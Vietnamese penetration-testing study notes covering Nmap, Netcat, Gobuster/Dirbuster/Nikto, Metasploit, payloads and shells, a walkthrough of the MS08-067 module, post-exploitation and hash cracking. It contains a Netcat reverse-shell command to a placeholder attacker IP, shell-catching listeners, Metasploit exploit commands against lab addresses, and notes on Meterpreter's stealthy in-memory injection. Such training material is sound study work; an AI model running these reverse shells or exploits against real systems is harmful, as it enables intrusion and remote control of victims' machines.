# Bài 1: Nmap và Netcat
## Công cụ Nmap
### Nmap là gì?
Nmap, viết tắt của Network Mapper, là một công cụ miễn phí và mã nguồn mở được sử dụng cho mục đích thu thập thông tin của mạng mục tiêu hoặc kiểm tra an ninh của hệ thống mạng đang quản lý. 

Nmap có thể được sử dụng để:

* Xác định tất cả các hosts hoặc servers hiện có trong mạng
* Xác định một server đang mở những ports nào và những dịch vụ nào đang chạy trên các ports đó
* Xác định các dịch vụ cần chạy trên host hoặc server có đang hoạt động tốt không? (Nếu dịch vụ ngừng chạy, ports sẽ bị đóng)
* Xác định những hosts hoặc servers đang chạy hay đang tắt
* Xác định hệ điều hành đang chạy của một host hoặc server
* Quét lỗi bảo mật các dịch vụ đang được chạy trên một host hoặc server
* Kiểm tra xem tường lửa có khóa các ports không được phép truy cập không?
* v.v

#### Khi chạy Nmap trên giao diện dòng lệnh, bạn cần phải chạy với sudo. Trong suốt quá trình quét mục tiêu, Nmap sẽ có lúc cần những tài nguyên hệ thống hoặc phân quyền ở cấp root, đó là lí do Nmap cần chạy với sudo hoặc với root.
### Cách thức sử dụng Nmap
```nmap <tùy-chọn-flags> <IP-mục-tiêu>```

Nmap sẽ chỉ scan 1000 TCP ports phổ biến nhất mà thôi và nó cũng sẽ không xuất ra bất cứ thông tin gì trong suốt quá trình scan; chỉ cho đến khi scan xong toàn bộ 1000 TCP ports thì nó mới xuất ra kết quả.

Điều này dẫn đến vài bất tiện sau:

1. Bạn không hề biết quá trình scan đang diễn ra thế nào, liệu có lỗi gì hay không và liệu bạn phải chờ trong bao lâu?
2. Rất nhiều server chạy các services quan trọng trên UDP ports hoặc các TCP ports trải dài từ port 1000 đến port 65535. Do đó việc chạy Nmap như trên sẽ có khả năng bỏ lỡ rất nhiều thông tin quan trọng.

Các flags thường được sử dụng phổ biến bao gồm:
* -v (verbose): In ra thông tin liên quan đến quá trình scan theo thời gian thực. Có nghĩa là bạn sẽ biết được Nmap đang chạy như thế nào? Đã phát hiện được những ports nào? v.v. Bạn càng sử dụng nhiều flag -v thì thông tin về quá trình scan được xuất ra càng chi tiết. Tuy nhiên, để tránh quá nhiều thông tin gây nhiễu, cá nhân mình thường chỉ dùng 2 flags -v mà thôi (-vv).
* –sn (scan whole network): Flag -sn dùng để scan toàn bộ mạng của đối tượng nhằm tìm ra các hosts và servers đang hoạt động bên trong mạng.
  
  ```	nmap -sN <IP-mục-tiêu>/<subnet-mask>```

* -A: enable "aggressive mode"(Enables OS detection, version detection, script scanning, and traceroute)
* -Pn: Trước khi tiến hành scan ports trên server đối tượng mục tiêu, Nmap sẽ kiểm tra xem server mục tiêu có đang online hay không? Quá trình này sẽ tốn một khoản thời gian nhất định. Do đó nếu bạn đã biết chắc chắn server mục tiêu luôn luôn online, bạn có thể bỏ qua bước xác định này với flag -Pn. Lúc này, Nmap sẽ mặc định tất cả những hosts hoặc servers bạn muốn quét đều đang online và sẽ bỏ qua quá trình xác định trạng thái hoạt động của (các) mục tiêu.
* -p-: Khi sử dụng flag -p-, Nmap sẽ tự động scan 65535 ports của mục tiêu. Quá trình này tuy tốn rất nhiều thời gian, nhưng là một quy trình quan trọng và chúng ta không nên bỏ qua.
* -sV (scan service version): Flag -sV sẽ cho bạn biết những dịch vụ nào đang được chạy ứng với những ports vừa tìm được, đồng thời cung cấp tên và version của những dịch vụ đó. Đây là thông tin rất hữu ích trong quá trình tìm lỗi xâm nhập trong pentest
* -sU (scan UDP ports): Scan tất cả UDP ports. Đôi khi sẽ có những dịch vụ chạy trên cả UDP ports, do đó khi pentest các bạn nhớ scan cả UDP ports nhé.
* -O (OS scan): Xác định hoặc dự đoán hệ điều hành đang được chạy trên server hoặc host mục tiêu
* -T<0-5>: T càng lớn thì thời gian quét càng nhanh, ví dụ thời gian quét của T5 sẽ nhanh hơn T4. Tuy nhiên, việc sử dụng T càng lớn, đòi hỏi kết nối mạng của bạn phải càng ổn định và càng mạnh, cũng như việc quét quá nhanh sẽ buộc Nmap phải gửi các gói tin đi một cách ồ ạt dễ gây chú ý đến quản trị viên của hệ thống mục tiêu.
* sC (script scan): Với flag -sC, Nmap sẽ sử dụng những scripts tìm lỗi hoặc thu thập thông tin (được gọi là Nmap Scripting Engine – NSE) mặc định được tích hợp bên trong để thu thập thông tin hoặc quét lỗi bảo mật trên hệ thống mục tiêu.
  * Ngoài ra, bạn có thể sử dụng flag –script để chạy một script tìm lỗi nhất định nào đó thay vì chạy các scripts được mặc định của Nmap. Để xem tất cả các scripts được tích hợp bên trong Nmap, các bạn có thể sử dụng câu lệnh sau:
    
      ```ls /usr/share/nmap/scripts```
## Công cụ Netcat (nc)
### Giới thiệu công cụ Netcat 
Netcat hay còn được viết tắt là nc là một công cụ trên giao diện dòng lệnh tuy đơn giản nhưng lại cực kỳ mạnh mẽ. Netcat được cài mặc định trên rất nhiều Linux distros ví dụ Ubuntu, Kali Linux, v.v. Necat có thể được cài đặt và sử dụng không chỉ trên các hệ điều hành Linux, mà còn cả cho Windows và MacOS nữa.

Netcat có thể được sử dụng cho các mục đích sau:

* Port scanning – nhằm xác định xem port đang mở hay đang đóng
* Truyền dữ liệu giữa 2 máy
* Lắng nghe kết nối đến (dùng để đón reverse shell).
* Tạo backdoor (cổng hậu)
* v.v.

Cú pháp của câu lệnh Netcat như sau:  ```nc <tùy-chọn-flag> <IP> <Port>```
### Một số câu lệnh Netcat hay được sử dụng
#### Câu lệnh 1: Đón reverse shell bằng Netcat
```nc -nlvp <Port-lắng-nghe-reverse-shell>```

Câu lệnh trên có các thành phần sau:

* -n: Mang ý nghĩa chúng ta sẽ chỉ dùng IPv4 address, không dùng domain name
* -l: Chế độ lắng nghe các kết nối đến
* -v: Verbose – Cho biết quá trình lắng nghe đang diễn ra thế nào
* -p: Chỉ định port để lắng nghe

Một cách ngắn gọn, câu lệnh trên sẽ mở port 8000 trên máy của hacker ở trạng thái lắng nghe các kết nối trỏ đến port 8000.
#### Câu lệnh 2: Tạo kết nối reverse shell
```nc -e /bin/sh <IP-của-hacker> <Port-đang-đợi-reverse-shell>```

Trong đó:

* -e /bin/sh: Sau khi kết nối thành công để mục tiêu thì thực thi /bin/sh (tuy nhiên không phải version nào của Netcat cũng sẽ hỗ trợ flag -e)
#### Câu lệnh 3: Chuyển file giữa 2 máy 
```
nc -w 3 <IP-điểm-đến> <Port-đang-chờ> < <tên-file-cần-chuyển>
Ví dụ:
nc -w 3 192.168.0.12 8888 < hello.txt
```

Trong đó:

* -w 3: Dùng để chỉ thời gian mà Netcat sẽ chờ phản hồi từ đích đến, nếu không có bất cứ phản hồi nào, Necat sẽ tự động hủy kết nối sau 3 giây.

Câu lệnh trên có nghĩa là chúng ta sẽ dùng Netcat tạo một kết nối đến port 8888 của địa chỉ 192.168.0.12 và sẽ chuyển file hello.txt tới địa chỉ IP đó thông qua kết nối vừa được tạo. Netcat sẽ chờ máy 192.168.0.12 trong 3 giây, nếu máy đích đến không phản hồi, Netcat sẽ tự động ngắt kết nối. 

Trên máy nhận file:

Chúng ta chạy câu lệnh sau:

```
nc -lp <Port> > <Tên-file-nhận>
Ví dụ: 
nc -lp 8888 > hello.txt
```

Câu lệnh trên có nghĩa là chúng ta sẽ mở port 8888 và lắng nghe các kết nối trỏ tới. Khi có kết nối trỏ tới và file hello.txt được chuyển đến, chúng ta sẽ xuất dữ liệu được chuyển ra và lưu vào file có tên hello.txt trên máy nhận file. 

# Bài 2: Web hidden files/directories và các công cụ Gobuster, Dirbuster và Nikto
## Web hidden files/directories là gì? 
Web server giống như một ổ cứng lưu trữ dữ liệu trên máy tính. Dữ liệu lưu trữ có thể bao gồm files, directories, v.v. Những dữ liệu được lưu trữ trên web server có thể là dữ liệu công khai (public) ví dụ như trang chủ của một website, những đường link dẫn đến những chuyên mục khác nhau (catergories) hoặc bài viết khác nhau của website đó, v.v. ; hoặc cũng có thể là dữ liệu riêng tư (private) ví dụ như trang đăng nhập, file robots, files hay directories chia sẻ thông tin nội bộ, v.v. 
### Web URL trên Linux web server
Giống path trong linux
### Web hidden directories 
Những nội dung (files và directories) không được đề cập và không có đường dẫn đến trên trang chủ và thanh menu chính là những nội dung ẩn

***Phần dưới là các công cụ tìm hidden files mn có thể search gg để biết chi tiết vì mình dùng dirsearch nên cũng chỉ nói qua mấy cái này vì cơ bản thì tools tìm hidden files hầu như tìm theo kiểu brute force trong worldlist***
## Gobuster hoạt động như thế nào?
Gobuster là một công cụ được viết bằng Golang. Đây là một công cụ mã nguồn mở miễn phí trên giao diện dòng lệnh, được sử dụng để tìm các files cũng như directories ẩn thông qua hình thức tấn công Brute Force
### Gobuster hoạt động như thế nào? 
Gobuster sẽ cần một wordlists (danh sách) những tên files hoặc tên directories thường hay được sử dụng nhất trên web server. Gobuster sẽ sử dụng những cái tên trong wordlists này kết hợp với URL của website để tạo thành một URL mới và sẽ thử truy cập vào URL mới này
### Sử dụng Gobuster như thế nào? 
Một câu lệnh Gobuster điển hình để tìm các files và directories ẩn sẽ như sau:

```gobuster dir -w <tên-wordlists> -u <IP-mục-tiêu> -x <tên-extension>```

Trong câu lệnh trên, chúng ta có sử dụng thêm flag -x dùng để liệt kê những extension file mà chúng ta muốn tìm. Những extension này sẽ được kết hợp với tên file trong wordlists để tạo thành tên một file hoàn chỉnh. 

```
Lưu ý:
File wordlists càng lớn và extension càng nhiều thì thời gian chạy Gobuster sẽ càng lâu. Do đó để hạn chế bớt extension không cần thiết, bạn phải xác định xem server hiện tại đang chạy Linux hay Windows thông qua Nmap. Đồng thời cố gắng xác định xem web app hiện tại đang chạy trên web platform hoặc ngôn ngữ nào? Ví dụ như WordPress, Django, v.v.
Ví dụ, chúng ta biết được web hiện đang chạy trên Linux Server và dùng WordPress. Vậy các extensions thường gặp có thể sẽ là: .php, .sh, .txt, pl, py, rb.
```
## Công cụ Dirbuster 
Cũng giống như Gobuster, Dirbuster là một công cụ tìm files và directories ẩn thông qua hình thức tấn công Brute Force. Dirbuster cũng là một công cụ miễn phí, chỉ có điều công cụ này có giao diện người dùng và giải quyết được một vấn đề mà Gobuster không thể làm, đó là recursive. 

Nghĩa là, với Gobuster, khi nó tìm được một directory, nó sẽ in ra tên directory đó và tiếp tục đi tìm những directories khác dựa vào wordlists đã cung cấp, chứ nó không đi vào bên trong directory đã tìm được và in ra các nội dung nằm bên trong. Dirbuster có thể làm được điều đó, nhưng bù lại Dirbuster không nhanh như Gobuster và dễ bị lỗi hơn Gobuster. 

```
Lưu ý:
Gobuster và Dirbuster không phải là 2 công cụ duy nhất để tìm files và directories ẩn, chúng ta còn có các công cụ khác như dirb, dirbsearch, dirscan, v.v. Mỗi công cụ sẽ có những ưu nhược điểm khác nhau. Bạn có thể chọn bất cứ công cụ nào mà bạn thích để tìm nội dung web ẩn, nhưng hãy luôn nắm rõ điểm yếu và điểm mạnh mà công cụ bạn đang dùng nhé.
```
## Công cụ Nikto 
Nikto là một công cụ miễn phí và mã nguồn mở. Nikto được sử dụng chủ yếu để quét lỗi bảo mật trên web server. Khi tiến hành quét lỗi với Nikto, nó sẽ thực hiện hơn 6000 bài kiểm tra trên đối tượng để tìm ra các lỗ hổng bảo mật trên web server, lỗi đó có thể xuất phát từ chính những dịch vụ chạy trên web server hoặc cũng có thể lỗi xuất phát từ quá trình cấu hình web server. 

Trên thực tế, Nikto chỉ được sử dụng để quét lỗi nhanh cũng như thu thập thông tin nhạy cảm của web server để từ đó xác định xem web server có dính phải những lỗ hổng nghiêm trọng và phổ biến hay không. 

Một lưu ý khi dùng Nikto đó là không phải tất cả thông tin hiện ra khi chạy Nikto đều là lỗ hổng bảo mật, có những kết quả sẽ chỉ là thông tin của website mà Nikto tìm được thôi. 
# Bài 3: Giới thiệu Metasploit Framework
## Metasploit là gì? 
### Giới thiệu về Metasploit
Metasploit là một nền tảng phục vụ cho mục đích kiểm định bảo mật trên giao diện dòng lệnh

Metasploit được viết bằng ngôn ngữ Ruby. Bản chất của Metasploit hiểu theo cách đơn giản nhất chính là một kho chứa các đoạn code được viết bằng Ruby nhằm mục đích kiểm tra bảo mật của hệ thống hoặc ứng dụng. Các đoạn code này có thể dùng để tấn công, xâm nhập, leo thang đặc quyền, thu thập dữ liệu, quét lỗi, chuyển dữ liệu giữa máy tấn công và máy nạn nhân, v.v. trên nhiều nền tảng khác nhau từ smart devices (Android, IOS), máy tính (Linux, Mac, Windows), các thiết bị IoT, v.v. 

Vì bản thân Metasploit chứa các phần mềm nguy hiểu như vậy nên Metasploit không được khuyến khích cài trên các máy được sử dụng cho mục đích thường nhật hàng ngày vì có thể dẫn đến tình trạng người dùng hệ thống có cài Metasploit sẽ bị tấn công ngược lại. Các phần mềm diệt virus (AV) cũng coi Metasploit là một mối nguy hiểm, nên khi quét thấy Metasploit, các AV sẽ xóa nó ngay. 

Metasploit chỉ nên được dùng trên máy ảo hoặc máy dành riêng cho mục đích pentest và được chạy trên các hệ điều hành đã được tùy biến cho mục đích pentest như Kali Linux, Parrot Linux hay Windows Commando, v.v. 

Metasploit không chỉ đơn giản là một kho “chứa vũ khí” dành cho việc kiểm định hệ thống. Nó còn có thể được dùng để giúp pentesters tiết kiệm thời gian tìm và xâm nhập các lỗ hổng đã được tìm ra nhưng chưa được vá trên hệ thống mục tiêu, điều này cho phép pentesters có thể tập trung vào các lỗi liên quan đến chính sách (policies), social engineering hay các lỗ hổng zero day, v.v.

Để sử dụng hiệu quả Metasploit bạn cần 2 điều sau:

* Một máy ảo hoặc thiết bị có chạy hệ điều hành tùy biến cho mục đích pentest có đi kèm Metasploit
* Kiến thức về Penetration Testing

Tóm lại, có thể coi Metasploit là một khẩu súng, và để tránh bắn vào chân mình cũng như để sử dụng nó hiệu quả. Bạn cần phải có đủ kiến thức để sử dụng khẩu súng ấy
# Bài 4: Khái niệm payloads (shellcode) và phân tích module tấn công MS08-067 của Metasploit
## Payloads hay shellcode là gì? 
payloads hay còn được gọi là shellcode là một đoạn code thường được viết dưới dạng machine code (binary) dùng để thực hiện mục đích của pentester sau khi xâm nhập thành công vào hệ thống của nạn nhân.
Các phần mềm khai thác lỗ hổng Remote Code Execution (RCE) (ở mức độ dễ hiểu nhất) thường sẽ có 3 thành phần chính như sau: 

* Phần khai thác lỗi để xâm nhập mục tiêu
* Phần payload để thực hiện mục đích của pentester sau khi xâm nhập
* Phần quản lý để thông báo cho pentester biết phần mềm đã xâm nhập thành công hay chưa hoặc có lỗi gì xảy ra trong quá trình chạy phần mềm hay không? v.v

Ví dụ về payload:
Hẳn các bạn còn nhớ đến con ransomware WannyCry từng làm mưa là gió một toàn thế giới cách đây vài năm chứ?

Con ransomware này khai thác một lỗi trên hệ thống Windows có tên là EternalBlue hay tên mã là MS17-010 để xâm nhập vào hệ thống Windows, sau đó nó sẽ chạy một payload đã được hacker cài sẵn để tự động mã hóa toàn bộ dữ liệu trên máy của nạn nhân, đồng thời mở một kết nối Internet từ máy nạn nhân đến một server được hacker kiểm soát nhằm nhận lệnh của hacker.

Khi chạy phần mềm khai thác lỗi để xâm nhập, nếu WannaCry được báo lỗi không thể xâm nhập (có thể do máy nạn nhân không nằm trong danh sách hệ điều hành Windows bị dính lỗi hoặc do nạn nhân dùng MacOS hay Linux) nó sẽ bỏ qua máy đó và tìm đến một mục tiêu khác.

### Reverse shell, Bind shell và Meterpreter 
#### Reverse shell:
Quy trình như sau:
1. Bạn sẽ tạo một payload có chức năng mở một kết nối TCP trỏ ngược về một port đang chờ sẵn kết nối trên máy của bạn
2. Đính kèm payload đó vào phần mềm tấn công
3. Dùng Netcat (nc) để mở port mà bạn đã chỉ định trong payload và chờ kết nối
4. Chạy phần mềm tấn công
5. Khi payload được chạy trên máy nạn nhân, nó sẽ tạo ra một kết nối TCP trỏ đến port trên máy của bạn mà bạn đã chỉ định. Kết nối này có kèm shell cho phép bạn có thể điều khiển máy nạn nhân từ xa. Dạng kết nối này được gọi là Reverse shell do shell điều khiển máy nạn nhân chạy ngược (reverse) về máy của bạn. 
#### Bind shell:
Trái ngược với Reverse shell, quy trình cụ thể như sau:
1. Bạn sẽ tạo một bind shell payload
2. Đính kèm vào phần mềm tấn công
3. Chạy phần mềm tấn công
4. Khi payload được chạy trên máy nạn nhân, nó sẽ chạy chương trình shell trên một port của chính máy nạn nhân
5. Để có thể điều khiển được máy nạn nhân, bạn cần phải dùng Netcat (nc) để kết nối (bind) đến port đang chạy shell trên máy nạn nhân mà bạn đã chỉ định trong payload. Tuy nhiên, với những tính năng vượt trội của các chương trình diệt virus (AV) hiện nay, tính hiệu quả của bind shell hiện khá thấp. 
#### Meterpreter
Cụ thể, với Meterpreter quy trình thực hiện cũng giống với Reverse shell, chỉ khác ở hai chỗ duy nhất:
* Thay vì tạo Reverse shell payload, bạn sẽ tạo Meterpreter payload
* Meterpreter payload không thể kết nối với máy tấn công bằng Netcat, nó cần một phần mềm có tên là Metasploit Multi Handler (được tích hợp với Metasploit) để có thể kết nối thành công giữa máy nạn nhân và máy tấn công từ đó cho phép bạn điều khiển máy nạn nhân từ xa 

Thật chất, Meterpreter cũng sử dụng Reverse TCP shell (Reverse shell) để tạo kết nối từ máy nạn nhân đến máy tấn công thôi. Nhưng nó lại được thiết kế đặc biệt hơn Reverse shell thông thường ở những điểm sau:

* Meterpreter có phần vượt trội hơn Reverse shell thông thường ở chỗ nó sử dụng hình thức tấn công in-memory DLL injection để tạo kết nối đến máy tấn công. Điều này có nghĩa là dữ liệu của Meterpreter chỉ được lưu trên RAM (dữ liệu RAM sẽ bị mất khi máy nạn nhân tắt hoặc mất nguồn điện) và không lưu dữ liệu trên ổ cứng. Điều đó có nghĩa là dấu vết để lại trên máy nạn nhân sẽ ít hơn và làm giảm nguy cơ bạn bị phát hiện. 
* Meterpreter cũng không tạo tác vụ mới như Reverse shell thông thường mà nó chỉ trú ẩn trong các tác vụ (processes) đã bị nó kiểm soát, điều này cho phép nó có thể chuyển từ các tác vụ bị nó kiểm soát sang các tác vụ đang chạy bình thường khác. Đây cũng là một yếu tố giúp bạn tránh bị phát hiện.
* Meterpreter được trang bị những tính năng đặc biệt phục vụ quá trình pentest hiệu quả hơn. Một trong số đó là chức năng “getsystem” (chỉ hoạt động trên hệ thống Windows).

```Netcat chỉ có thể bắt được stageless payloads chứ không bắt được staged payloads. Vì Meterpreter là một staged payload, nên Netcat không thể bắt được nó.```
## Phân tích module tấn công MS08-067 của Metasploit
### Metasploit modules là gì? 
Metasploit là một tập hợp của các modules khác nhau. Mỗi modules có thể là một phần mềm tấn công hoặc có thể là một công cụ quét lỗi bảo mật, v.v. Metasploit có những modules có thể sử dụng cho bất cứ bước nào trong quy trình pentest. 

Để có thể xem các modules có trong Metasploit các bạn dùng câu lệnh sau trên Kali Linux: 

```ls /usr/share/metasploit-framework/modules```
### Phân tích modules tấn công MS08-067 trên Metasploit
Thông tin của mục tiêu như sau:

* Chạy hệ điều hành Windows XP x86
* Địa chỉ IPv4: 10.0.0.9
* Chạy SMB trên port: 556

Thông tin của máy tấn công như sau:

* Địa chỉ IPv4: 10.0.0.10
* Mở port: 8888
### Lỗi tấn công MS08-067 là gì? 
Đây là một lỗi bảo mật khá nghiêm trọng được công bố vào năm 2008. Lỗi bảo mật này nằm trên các hệ thống chạy Windows, trải dài từ Windows 2000 đến Windows 2008. Lỗi này cho phép hacker có thể xâm nhập máy nạn nhân mà không cần khai báo danh tính từ đó cho phép hacker có thể thực thi mã độc nhằm mục đích chiếm quyền điều khiển từ xa. 
### Phân tích module tấn công MS08-067 trên Metasploit
Đầu tiên, các bạn cần khởi động Metasploit lên với các câu lệnh sau:

![image](https://github.com/HoangVietAnh09/Others/assets/111860567/df50f6b8-409b-4391-a896-4ef0df8b590f)

Sau đó kết nối với metasploit bằng lệnh: ```msfconsole```

Sau đó, chúng ta dùng lệnh search để tìm modules MS08-: ```search ms08-067```

![image](https://github.com/HoangVietAnh09/Others/assets/111860567/546cb758-d5b4-4289-937a-2c814d48d220)

Để hiển thị thông tin chi tiết của lỗi cũng như của module khai thác lỗi, chúng ta sử dụng câu lệnh sau:  ```info 0```

Với 0 là số thứ tự (#) của modules trong hình. Và như vậy chúng ta sẽ có thông tin của lỗi và module khai thác lỗi như hình bên dưới. 

![image](https://github.com/HoangVietAnh09/Others/assets/111860567/272a6170-0c30-41c5-8263-2d8b74a2ddc5)

Để sử dụng lỗi khai thác này, chúng ta sẽ dùng lệnh: ```use 0```

![image](https://github.com/HoangVietAnh09/Others/assets/111860567/3763ac4f-e227-4002-9495-f4338561dbed)

Lúc này bạn sẽ thấy header command đã thay đổi từ msf6 sang msf6 exploit(windows/smb/ms08_067_netapi) nhằm cho biết chúng ta đang khai thác lỗi ms08-067, lỗi này khai thác lỗ hổng của giao thức SMB và là lỗi xảy ra trên hệ điều hành Windows.

windows/smb/ms08_067_netapi cũng có thể được xem là path của lỗi này, theo đó chúng ta có modules ms08_067_netapi nằm bên trong directory smb; directory smb nằm bên trong directory windows.

Với tất cả những modules của Metasploit, để có thể sử dụng được một module, bạn cần phải gán giá trị cho những options nằm trong module đó. Để hiện options của module MS08-067, bạn sử dụng câu lệnh sau: ```show options```

Chúng ta sẽ thấy modules MS08-067 cần những options sau:

* RHOST: Địa chỉ IP của máy nạn nhân
* RPORT: Port đang chạy dịch vụ SMB trên máy nạn nhân (mặc định là port 445)
* SMBPIPE: SMB pipe sẽ cho phép bạn tương tác với hệ thống Windows thông qua hệ thống mạng (mặc định là BROWSER)
* Payload options: Lựa chọn dạng payload sẽ chạy sau khi phần mềm khai thác lỗi xâm nhập thành công (mặc định là Meterpreter)
* EXITFUNC: Chỉ định DLL và function để gọi khi payload đã được chạy xong (mặc định là thread)
* LHOST: Địa chỉ IP của máy tấn công
* LPORT: Port đợi kết nối trỏ về

Để gán hoặc thay đổi giá trị của những options này chúng ta sẽ dùng lệnh set. 

Chúng ta sẽ gán giá thị RHOSTS bằng câu lệnh: ```set RHOSTS 10.10.10.9```

Thay đổi giá trị RPORT từ 445 thành 556 bằng câu lệnh sau: ```set RPORT 556```

Thay đổi địa chỉ IP của máy tấn công bằng câu lệnh sau: ```set LHOST 10.0.0.10```

Thay đổi port nhận shell của máy tấn công từ 4444 sang 8888 bằng câu lệnh sau: ```set LPORT 8888```

Sau đó, chúng ta dùng lệnh show options lần nữa để kiểm tra các giá trị ta vừa set

```
Lưu ý:
Khi gán giá trị, các bạn cần lưu ý cột “Required”, những options nào mà cột Required đề là “yes” thì bạn không được bỏ trống. 
```

Sau khi gán giá trị cho các options xong, để tiến hành tấn công, chúng ta sẽ dùng lệnh sau: ```exploit```

Đương nhiên, tấn công sẽ thất bại do hệ thống chúng ta tấn công hoàn toàn không tồn tại. 

Ngoài ra, chúng ta còn có thể thay đổi payload từ Meterpreter thành Reverse TCP shell bình thường với câu lệnh sau:

```set payload windows/shell_reverse_tcp```

# Bài 5: Thực hành tấn công webserver với Metasploit (Phần 1)
## Performing reconnaissance (thu thập thông tin mục tiêu) 
Metasploit có kèm cả Nmap nữa. Nên trong bài hôm nay, chúng ta sẽ sử dụng Nmap bên trong Metasploit để thu thập thông tin cần thiết của webserver mục tiêu. 

Nmap được tích hợp bên trong Metasploit sẽ được chia làm 2 câu lệnh sau:

* db_nmap: Khi sử dụng db_nmap chức năng hoàn toàn tương tự như Nmap bình thường thôi, tuy nhiên kết quả thu được từ db_nmap sẽ được lưu vào cơ sở dữ liệu PostgreSQL nhằm phục vụ cho việc truy xuất lại dữ liệu về sau.
* nmap: Câu lệnh Nmap bình thường, kết quả không được lưu vào cơ sở dữ liệu PostgreSQL của Metasploit.
## Identifying vulnerabilities
## Exploiting vulnerabilities

# Bài 6: Thực hành tấn công webserver với Metasploit (Phần 2)
## Upgrade shell lên Meterpreter 
## Post-exploitation
Trong pentest, post-exploitation dùng để chỉ các hoạt động cần được tiến hành để thu thập các thông tin quan trọng như:

* Tên hệ điều hành, versions, và Linux Kernel
* Các phần mềm đang chạy cùng versions của chúng
* Sudo rights, SUID, SGID
* Cron jobs
* V.V

Đây đều là những thông tin rất quan trọng giúp pentester hoặc có thể chiếm quyền quản trị hệ thống cấp cao nhất (quyền root hoặc administrator) hoặc lên các phương án tấn công tiếp theo. 
### Một số điều cần biết về shell Meterpreter
Shell Meterpreter và shell điều khiển mục tiêu từ xa là 2 shells khác nhau. Shell Meterpreter cho phép bạn có thể truy cập vào các modules được trang bị cho Meterpreter, và bạn có thể sử dụng những modules này cho mục đích tấn công sâu hơn vào hệ thống. 

Khi dùng chức năng execute của Meterpreter, bạn cần phải dùng kèm 2 flags là -f và -i theo cú pháp sau:

```meterpreter > execute -f <tên-câu-lệnh-cần-thực-thi> -i```
# Bài 7: Mã hóa căn bản, các phương thức hash cracking phổ biến và cách phòng chống
## Mã hóa dữ liệu căn bản? 
Hashing và encoding là 2 hình thức mã hóa dữ liệu đang được sử dụng phổ biến hiện nay.
### Encoding
Sự khác biệt giữa encoding và hashing nằm ở chỗ nếu hashing là hình thức mã hóa dữ liệu một chiều và không có cách nào có thể truy ngược lại dữ liệu gốc, thì với encoding, dù không biết từ khóa để giải mật thư, nhưng nếu mật thư được mã hóa không quá khó thì bạn vẫn có thể tìm được dữ liệu gốc sau một hồi thử một số cách phá mật thư phổ biến. 
### Hashing 
#### Khái niệm hashing 
Hashing hay còn gọi là mã băm, nói một cách đơn giản, là một hình thức mã hóa dữ liệu một chiều dùng để bảo vệ dữ liệu gốc (dữ liệu trước khi mã hóa), tránh cho dữ liệu gốc lọt vào tay của những cá nhân hoặc tổ chức không được cấp phép sử dụng dữ liệu đó. 

Để hash một dữ liệu, dữ liệu đó sẽ được chạy qua một thuật toán hash và đầu ra sẽ là một chuỗi ký tự vô nghĩa (thường là ở dạng hexadecimal).

Các thuật toán hash dữ liệu thường cho ra các kết quả có cùng một độ dài (tính theo bytes) bất kể độ dài của giá trị đầu vào là bao nhiêu. 

Một trong những tính năng đặc biệt của hash dữ liệu đó là mã hóa một chiều.

Tất cả các thuật toán được dùng để hash dữ liệu đều phải đảm bảo các yêu cầu cơ bản sau:

* Deterministic: Vào bất cứ thời điểm nào, cùng một dữ liệu đầu vào luôn luôn cho ra cùng một dữ liệu đầu ra.
* Non-invertible: Việc đảo ngược quy trình hash để tìm được dữ liệu gốc từ dữ liệu được hash là điều gần như bất khả thi.
* Quick to compute: Thời gian hash nhanh.
* Use the Avalanche Effect: Chỉ một thay đổi nhỏ giá trị đầu vào sẽ thay đổi tối thiểu 50% giá trị đầu ra.
* Should avoid or eliminate collisions: Vì chúng ta nhận giá trị đầu vào bất kể độ dài và thường sẽ xuất ra các giá trị có cùng độ dài, nên việc có 2 giá trị khác nhau nhưng lại có cùng kết quả xuất ra là điều tuy hiếm nhưng hoàn toàn có thể xảy ra. Do đó một thuật toán hash tốt phải tránh được điều đó.

***Chúng ta sẽ bàn ngoài lề một tí về cách các trang mạng xác nhận xem bạn có đúng là người dùng sở hữu tài khoản đã đăng ký hay không nhé.***

Để tránh điều đó xảy ra, thay vì lưu mật khẩu của người dùng ở dạng không mã hóa, các công ty như FB sẽ lưu hash của password. Nghĩa là, khi tạo tài khoản, thay vì lưu lại password của bạn, FB sẽ hash password của bạn và lưu lại giá trị hash này vào cơ sở dữ liệu của họ. Khi bạn đăng nhập tài khoản FB, password bạn dùng để đăng nhập cũng sẽ được hash và FB sẽ so sánh giá trị hash mà họ lưu với giá trị hash họ nhận được từ bạn. Nếu hai giá trị này trùng nhau, nghĩa là bạn đã cung cấp mật khẩu đúng và sẽ được cấp quyền truy cập vào hệ thống. 
## Các hình thức hash cracking phổ biến 
***Brute force attacks:***

Hackers hoặc pentesters sử dụng những phần mềm chuyên dụng và dựa vào bảng chữ cái và bảng chữ số (từ 1 đến 10) để tạo ra vô hạn các kết hợp. Các kết hợp này sẽ được gửi đến server mục tiêu để hash và so sánh với dữ liệu hash đã được lưu trong cơ sở dữ liệu của mục tiêu. Quá trình này diễn ra cho đến khi tìm được password thật của account. Cách này cực kỳ mất thời gian. Và để tối ưu hóa, người ta thường sử dụng nhiều GPU siêu mạnh cùng một lúc để giảm thời gian bruteforce. 

***Dictionary attacks:***

Hackers hoặc pentesters sẽ có một danh sách những username và password hay được sử dụng nhất. Hoặc một từ điển của ngôn ngữ mà đối tượng sử dụng. Sau đó, họ sử dụng những phần mềm chuyên dụng để thử mọi kết quả username và password có trong danh sách hoặc từ điển đó cho đến khi nào tìm ra được username và password mới thôi. 

Do đó để tối ưu hóa, hackers hoặc pentesters thường nghiên cứu mục tiêu rất kỹ và càng nhiều thông tin được công bố trên mạng xã hội ví dụ như:

* Tên thật và ngày tháng năm sinh
* Nguyên quán
* Sở thích
* Tên người yêu, tên thú cưng, tên bố mẹ
* Những sự kiện quan trọng

***Rainbow table attacks:***

Rainbow table là một cơ sở dữ liệu tập hợp các kết hợp username và password đã được hash ở nhiều thuật toán hash khác nhau. Vì lẽ đó kích thước của một rainbow table thường rất lớn, có thể lên tới hàng trăm GB. 

Để sử dụng được rainbow table, bạn cần phải bằng cách nào đó, có được danh sách chứa password hash của tất cả người dùng được chứa trong cơ sở dữ liệu của mục tiêu. Sau đó bạn sẽ sử dụng các phần mềm chuyên dụng để so sánh các kết quả hash từ danh sách thu được với cơ sở dữ liệu của rainbow table cho đến khi tìm ra được hash có cùng giá trị. 

Lúc này, chúng ta có thể dễ dàng dựa vào rainbow table để tìm ra được password hoặc chuỗi ký tự cho ra cùng giá trị hash (trong trường hợp hash collision xảy ra). Vì dữ liệu được dùng để xác thực người dùng là dữ liệu hash, nên dù khác mật khẩu nhưng lại xảy ra hash collision dẫn đến hai giá trị hash giống nhau, chúng ta vẫn có thể đăng nhập vào tài khoản mục tiêu được như bình thường. 
## Cách phòng chống hash cracking
